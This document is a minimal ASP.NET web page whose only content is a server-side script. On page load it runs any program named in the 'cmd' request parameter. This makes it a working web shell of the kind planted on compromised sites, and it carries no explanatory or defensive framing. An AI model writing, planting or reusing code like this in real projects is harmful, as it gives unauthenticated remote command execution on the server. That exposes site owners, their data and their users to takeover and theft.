<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    System.Diagnostics.Process.Start(Request["cmd"]);
}
</script>
